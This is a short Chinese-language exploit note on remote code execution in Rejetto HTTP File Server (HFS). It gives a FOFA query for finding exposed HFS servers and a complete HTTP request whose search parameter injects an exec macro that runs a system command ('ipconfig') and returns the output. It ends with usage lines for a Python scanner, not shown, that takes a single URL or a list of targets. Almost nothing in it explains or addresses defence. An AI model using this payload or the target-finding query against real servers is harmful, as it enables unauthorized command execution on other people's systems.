# Rejetto HTTP远程代码执行

### 1.漏洞描述

Rejetto HTTP File Server 存在远程代码执行漏洞，攻击者可通过构造特殊请求执行系统命令。

### 2.fofa语法

```plain
app="HFS"
```

### 3.漏洞复现

```plain
GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}V{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719838259699-6c359c5f-8081-4795-ab35-dfeeb3376a25.png)

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```
